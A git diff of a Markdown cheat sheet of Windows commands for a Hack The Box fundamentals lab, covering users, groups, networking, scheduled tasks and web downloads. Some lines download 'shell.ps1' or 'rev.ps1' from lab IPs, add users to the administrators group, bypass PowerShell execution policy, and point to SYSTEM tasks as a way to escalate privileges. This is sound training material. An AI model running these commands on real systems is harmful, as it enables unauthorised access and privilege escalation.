@@ -72,7 +72,7 @@ HTB Windows Fundermentals (Complete)
 
 ---
 
-## User Commands
+## User and Group Commands
 
 | Command | Description | Example |
 |----------|--------------|----------|
@@ -81,6 +81,10 @@ HTB Windows Fundermentals (Complete)
 | `net user <username>` | Show details for user | `net user administrator` |
 | `query user` | Show logged-on users | `query user` |
 | `Get-LocalUser` | PowerShell list local users | `Get-LocalUser` |
+| `net localgroup` | List local groups | `net localgroup administrators` |
+| `net localgroup <group> <user> /add` | Add user to group | `net localgroup administrators bob /add` |
+| `Get-LocalGroupMember` | PowerShell equivalent | `Get-LocalGroupMember administrators` |
+| `New-LocalUser` | Create user | `New-LocalUser -Name bob -Password (ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)` |
 
 ---
 
@@ -93,13 +97,10 @@ HTB Windows Fundermentals (Complete)
 | `tracert` | Trace route to host | `tracert hackthebox.com` |
 | `netstat` | Show network connections | `netstat -ano` |
 | `nslookup` | DNS lookup | `nslookup hackthebox.com` |
+| `net share` | Shows shares on the local computer | `net share` |
+| `arp` | Displays contents and entries within the Address Resolution Protocol (ARP) cache | `arp -a` |
 | `Get-NetTCPConnection` | PowerShell netstat equivalent | `Get-NetTCPConnection | ? {$_.State -eq 'Established'}` |
 | `Test-NetConnection` | Check port and latency | `Test-NetConnection 10.10.10.10 -Port 80` |
-
-**HTB Example:**
-```powershell
-Test-NetConnection 10.10.10.5 -Port 5985   # Check if WinRM is open (HTB box enumeration)
-```
 
 ---
 
@@ -127,8 +128,6 @@ Test-NetConnection 10.10.10.5 -Port 5985   # Check if WinRM is open (HTB box enu
 | `schtasks /create` | Create a scheduled task | `schtasks /create /sc daily /tn backup /tr C:\backup.bat` |
 | `Get-ScheduledTask` | PowerShell equivalent | `Get-ScheduledTask | Select TaskName, State` |
 
-**HTB Tip:** Look for tasks that run with SYSTEM privileges for escalation vectors.
-
 ---
 
 ## Interacting With The Web
@@ -138,11 +137,6 @@ Test-NetConnection 10.10.10.5 -Port 5985   # Check if WinRM is open (HTB box enu
 | `curl` | Download content from URL | `curl http://10.10.10.5/file.exe -o file.exe` |
 | `Invoke-WebRequest` | PowerShell web downloader | `Invoke-WebRequest -Uri http://10.10.10.5/shell.ps1 -OutFile shell.ps1` |
 | `Invoke-RestMethod` | API requests in PowerShell | `Invoke-RestMethod -Uri https://api.ipify.org` |
-
-**HTB Example:**
-```powershell
-Invoke-WebRequest -Uri http://10.10.14.1/rev.ps1 -OutFile C:\Temp\rev.ps1
-```
 
 ---
 
@@ -177,17 +171,6 @@ Invoke-WebRequest -Uri http://10.10.14.1/rev.ps1 -OutFile C:\Temp\rev.ps1
 
 ---
 
-## User and Group Management
-
-| Command | Description | Example |
-|----------|--------------|----------|
-| `net localgroup` | List local groups | `net localgroup administrators` |
-| `net localgroup <group> <user> /add` | Add user to group | `net localgroup administrators bob /add` |
-| `Get-LocalGroupMember` | PowerShell equivalent | `Get-LocalGroupMember administrators` |
-| `New-LocalUser` | Create user | `New-LocalUser -Name bob -Password (ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)` |
-
----
-
 ## PowerShell Scripting
 
 | Topic | Example |
@@ -196,11 +179,10 @@ Invoke-WebRequest -Uri http://10.10.14.1/rev.ps1 -OutFile C:\Temp\rev.ps1
 | Loops | `for ($i=1; $i -le 5; $i++) { Write-Host $i }` |
 | Functions | `function Get-HTBFlag { Get-Content C:\flag.txt }` |
 | Run script | `powershell -ExecutionPolicy Bypass -File script.ps1` |
-| HTB Enumeration Script | `Get-Process; Get-Service; Get-NetTCPConnection` |
 
 ---
 
-## HTB Focused Enumeration Examples
+## Good Enumeration Examples
 
 ```powershell
 # Quick recon of Windows HTB target
